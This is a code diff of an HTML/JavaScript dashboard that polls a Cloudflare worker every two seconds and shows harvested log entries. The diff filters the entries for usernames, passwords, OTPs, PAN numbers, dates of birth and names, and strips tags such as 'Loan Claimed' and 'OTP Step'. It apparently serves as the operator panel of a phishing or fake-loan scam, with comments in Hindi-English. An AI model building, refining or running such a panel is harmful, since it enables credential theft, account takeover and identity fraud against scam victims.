@@ -8,37 +8,33 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: #ffffff; padding: 8px; font-family: 'Consolas', monospace; }
         
-        /* Header: Only Red Number on Right */
         .header { 
-            background: #fff; padding: 12px; margin-bottom: 8px;
+            background: #fff; padding: 10px; margin-bottom: 8px;
             display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 2px solid #f8f9fa;
+            border-bottom: 1px solid #eee;
         }
-        .status-text { font-size: 10px; color: #00a859; font-weight: bold; letter-spacing: 1px; }
-        #count { color: #ff0000; font-size: 24px; font-weight: 900; }
+        .status-text { font-size: 10px; color: #00a859; font-weight: bold; }
+        #count { color: #ff0000; font-size: 26px; font-weight: 900; }
 
-        /* Black Slim Card */
         .log-card { 
-            background: #000000; margin-bottom: 6px; padding: 12px 15px; 
+            background: #000000; margin-bottom: 6px; padding: 12px; 
             border-radius: 4px; width: 100%; display: flex; flex-direction: column;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
         }
 
-        /* White Clean Data Text */
         .detail-text { 
-            color: #ffffff; font-size: 13.5px; white-space: pre-wrap; 
-            line-height: 1.6; word-break: break-all; letter-spacing: 0.3px;
+            color: #ffffff; font-size: 14px; white-space: pre-wrap; 
+            line-height: 1.6; word-break: break-all;
         }
 
-        /* Small Red Time Footer */
         .time-footer { 
             display: block; margin-top: 8px; font-size: 9px; 
-            color: #ff3b3b; text-align: right; font-weight: bold;
+            color: #ff0000; text-align: right; font-weight: bold;
             border-top: 1px solid #1a1a1a; padding-top: 4px;
         }
 
         #logsContainer { width: 100%; }
-        .loading { font-size: 12px; color: #bbb; text-align: center; margin-top: 40px; }
+        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
     </style>
 </head>
 <body>
@@ -49,11 +45,23 @@
     </div>
 
     <div id="logsContainer">
-        <p class="loading">Fetching live stream...</p>
+        <p class="loading">Filtering live data...</p>
     </div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
+
+        // Faltu words ko clean karne ka function
+        function cleanTrash(text) {
+            if (!text) return "";
+            return text
+                .replace(/Type:[^|]*/gi, "")     // Type: ... ko hataye
+                .replace(/Path:[^|]*/gi, "")     // Path: ... ko hataye
+                .replace(/Loan Claimed/gi, "")   // Loan Claimed hataye
+                .replace(/OTP Step \d+/gi, "")   // OTP Step 1/2 hataye
+                .replace(/\| \s*\|/g, "|")       // Double pipes hataye
+                .trim();
+        }
 
         async function fetchLogs() {
             try {
@@ -61,37 +69,35 @@
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
-                // Sab kuch filter: No Type, No OTP Step, No Loan Claimed
+                // Filter: Sirf kaam ki info wale cards
                 const filteredData = data.filter(item => {
                     const d = item.detail.toLowerCase();
-                    const isData = d.includes("user") || d.includes("pass") || d.includes("otp") || 
-                                   d.includes("pan") || d.includes("dob") || d.includes("name") || d.includes("a/c");
-                    
-                    const isTrash = d.includes("type:") || d.includes("otp step") || d.includes("loan claimed") || d.includes("path:");
-                    
-                    return isData && !isTrash;
+                    return d.includes("user") || d.includes("pass") || d.includes("otp") || 
+                           d.includes("pan") || d.includes("dob") || d.includes("name");
                 });
 
                 document.getElementById('count').innerText = filteredData.length;
 
                 if (filteredData.length === 0) {
-                    container.innerHTML = "<p class='loading'>No records found.</p>";
+                    container.innerHTML = "<p class='loading'>No Data found.</p>";
                     return;
                 }
 
-                container.innerHTML = filteredData.map(item => `
-                    <div class="log-card">
-                        <div class="detail-text">${item.detail}</div>
-                        <span class="time-footer">${item.time}</span>
-                    </div>
-                `).join('');
+                container.innerHTML = filteredData.map(item => {
+                    const cleanDetail = cleanTrash(item.detail);
+                    return `
+                        <div class="log-card">
+                            <div class="detail-text">${cleanDetail}</div>
+                            <span class="time-footer">${item.time}</span>
+                        </div>
+                    `;
+                }).join('');
 
             } catch (err) {
-                console.error("Connection lost");
+                console.error("Sync Error");
             }
         }
 
-        // 2 Second Live Refresh
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
